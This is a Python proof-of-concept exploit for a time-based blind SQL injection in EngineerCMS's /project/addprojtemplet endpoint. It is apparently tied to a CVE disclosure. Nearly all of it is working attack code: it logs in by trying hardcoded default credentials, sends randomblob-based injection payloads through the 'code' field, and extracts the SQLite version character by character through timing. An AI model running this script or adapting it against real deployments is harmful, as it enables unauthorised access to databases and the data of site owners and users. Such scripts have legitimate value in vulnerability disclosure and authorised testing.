#!/usr/bin/env python3
"""
CVE-2025-44830 - EngineerCMS SQL Injection PoC
Affected: EngineerCMS v1.02 through v2.0.5
Endpoint: /project/addprojtemplet
"""

import requests
import sys
import time

TARGET = "http://localhost:8092"
CREDENTIALS = [
    ("qin.xc", "123456"),
    ("admin", "123456"),
]
PROJECT_ID = "25001"

def login(session):
    for username, password in CREDENTIALS:
        session.cookies.clear()
        resp = session.post(f"{TARGET}/post", data={
            "uname": username,
            "pwd": password
        }, allow_redirects=False)

        # Some builds always set a session cookie even when auth fails.
        # Verify auth by checking that the privileged endpoint is not redirected.
        test = session.get(f"{TARGET}/project/addprojtemplet", allow_redirects=False)
        if test.status_code == 200:
            return username

    return None

def test_sqli_time_based(session):
    print("[*] Testing time-based blind SQL injection...")
    
    normal_payload = "NormalTest"
    sqli_payload = "TEST' || (SELECT CASE WHEN 1=1 THEN randomblob(300000000) ELSE 0 END) || '"
    
    print(f"[*] Sending normal request...")
    start = time.time()
    resp = session.post(f"{TARGET}/project/addprojtemplet", data={
        "code": normal_payload,
        "name": "Normal",
        "label": "",
        "principal": "",
        "projid": PROJECT_ID,
        "ispermission": "false"
    })
    time_normal = time.time() - start
    print(f"    Response time: {time_normal:.2f}s")
    
    print(f"[*] Sending SQLi payload with randomblob (should be slow)...")
    start = time.time()
    resp = session.post(f"{TARGET}/project/addprojtemplet", data={
        "code": sqli_payload,
        "name": "SQLiTest",
        "label": "",
        "principal": "",
        "projid": PROJECT_ID,
        "ispermission": "false"
    })
    time_sqli = time.time() - start
    print(f"    Response time: {time_sqli:.2f}s")
    
    time_diff = time_sqli - time_normal
    print(f"    Time difference: {time_diff:.2f}s")
    
    return time_diff > 1.0

def extract_sqlite_version(session):
    print("[*] Extracting SQLite version via time-based blind injection...")
    
    version = ""
    known_chars = "0123456789."
    
    for pos in range(1, 8):
        for char in known_chars:
            payload = f"TEST' || (SELECT CASE WHEN substr(sqlite_version(),{pos},1)='{char}' THEN randomblob(100000000) ELSE 0 END) || '"
            
            start = time.time()
            resp = session.post(f"{TARGET}/project/addprojtemplet", data={
                "code": payload,
                "name": "VersionExtract",
                "label": "",
                "principal": "",
                "projid": PROJECT_ID,
                "ispermission": "false"
            })
            elapsed = time.time() - start
            
            if elapsed > 0.5:
                version += char
                print(f"    Found char at pos {pos}: '{char}' -> version so far: {version}")
                break
        else:
            break
    
    return version

def main():
    print("=" * 60)
    print("CVE-2025-44830 - EngineerCMS SQL Injection PoC")
    print("=" * 60)
    
    session = requests.Session()
    
    print(f"\n[*] Target: {TARGET}")
    print("[*] Trying known credentials...")
    
    authed_user = login(session)
    if not authed_user:
        print("[-] Login failed!")
        return 1
    
    print(f"[+] Login successful! User: {authed_user}")
    
    print("\n[*] Testing SQL injection vulnerability...")
    
    vuln_time = test_sqli_time_based(session)
    
    if vuln_time:
        print("\n" + "=" * 60)
        print("[+] VULNERABLE! SQL injection confirmed!")
        print("=" * 60)
        
        print("\n[*] Attempting to extract SQLite version...")
        version = extract_sqlite_version(session)
        if version:
            print(f"[+] SQLite version: {version}")
        
        print("\n[*] Vulnerability Details:")
        print("    - Endpoint: /project/addprojtemplet")
        print("    - Parameter: code (also: name)")
        print("    - Type: Time-based Blind SQL Injection")
        print("    - Database: SQLite")
        print("    - Root Cause: String concatenation in SQL query")
        print("    - File: models/ProjModel.go (Insertprojtemplet function)")
        
        return 0
    else:
        print("\n[-] Target does not appear to be vulnerable")
        return 1

if __name__ == "__main__":
    sys.exit(main())
